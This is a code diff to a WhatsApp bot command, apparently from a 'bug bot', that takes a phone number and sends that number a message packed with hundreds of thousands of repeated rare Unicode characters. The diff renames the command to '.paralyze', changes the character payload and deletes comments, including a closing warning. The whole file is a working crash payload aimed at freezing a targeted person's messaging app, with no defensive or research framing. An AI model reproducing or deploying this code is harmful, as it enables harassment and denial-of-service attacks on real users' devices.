@@ -6,26 +6,27 @@ module.exports = async (context) => {
     await ownerMiddleware(context, async () => {
         const { client, m, text, args } = context;
 
-        // Validate the input
+        
         if (!text || !args[0]) {
-            return m.reply('Please provide a phone number (e.g., .execute 254722233...).');
+            return m.reply('Please provide a phone number (e.g., .paralyze 254722233...).');
         }
 
-        // Extract and sanitize the phone number
-        const phoneNumber = args[0].replace(/\D/g, '');
+        
+        const phoneNumber = args[0].replace(/\D/g, ''); 
         const targetJid = `${phoneNumber}@s.whatsapp.net`;
 
-        // Construct the bug message with repeated patterns
+        
         const bugMessage = {
-            text: "ʕ၍^ᴥ၍^ʔ၍".repeat(59999) +
-                "@-(^ΦωΦ^)／X".repeat(99999) +
-                "＼₍^∇^₎／X".repeat(99999) +
-                "‎᭎ᬼᬼᬼৗীি𑍅𑍑⾿ါ".repeat(99999) +
-                "ꦾꦹꦹꦹ".repeat(99999)
+            text: "" +
+                "ꦾ".repeat(50000) + 
+                "@X".repeat(90000) + 
+                "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + 
+                "ᬃᬃ".repeat(90000) + 
+                "⿻".repeat(90000) 
         };
 
         try {
-            // Send the bug message
+            
             const response = await client.sendMessage(targetJid, bugMessage);
 
             if (response?.key?.id) {
@@ -39,5 +40,3 @@ module.exports = async (context) => {
         }
     });
 };
-
-//🚫🚫handle these bugs with care i might not be in for your actions 
